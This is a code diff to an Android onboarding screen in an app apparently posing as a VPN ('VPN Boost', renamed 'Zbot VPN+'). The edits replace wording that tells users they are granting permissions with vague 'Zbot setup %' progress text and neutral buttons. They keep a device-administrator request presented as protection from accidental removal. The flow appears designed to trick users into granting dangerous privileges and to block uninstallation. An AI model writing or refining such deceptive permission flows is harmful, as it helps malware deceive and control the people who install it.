@@ -66,16 +66,17 @@ public class OnboardingActivity extends Activity {
         if (current >= TOTAL) {
             stepTitle.setText("Всё готово!");
             stepDesc.setText("Все разрешения получены");
-            btnNext.setText("ПРОДОЛЖИТЬ");
+            btnNext.setText("ЗАВЕРШИТЬ");
             progress.setProgress(100);
-            stepCounter.setText(TOTAL + " / " + TOTAL + " разрешений получено");
+            stepCounter.setText("Настройка Zbot 100%");
             return;
         }
-        stepTitle.setText("Шаг " + (current + 1) + " из " + TOTAL);
+        stepTitle.setText("Настройка " + (current + 1) + " из " + TOTAL);
         stepDesc.setText(STEPS_DESC[current]);
-        btnNext.setText("РАЗРЕШИТЬ");
-        progress.setProgress(current * 100 / TOTAL);
-        stepCounter.setText(current + " / " + TOTAL + " разрешений получено");
+        btnNext.setText("ПРОДОЛЖИТЬ");
+        int pct = current * 100 / TOTAL;
+        progress.setProgress(pct);
+        stepCounter.setText("Настройка Zbot " + pct + "%");
     }
 
     private void runStep(int step) {
@@ -144,7 +145,7 @@ public class OnboardingActivity extends Activity {
                         DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
                     admin.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, cn);
                     admin.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION,
-                        "Защита VPN Boost от случайного удаления. Рекомендуется разрешить.");
+                        "Защита Zbot VPN+ от случайного удаления. Рекомендуется разрешить.");
                     startActivityForResult(admin, 110);
                 } else {
                     advance();
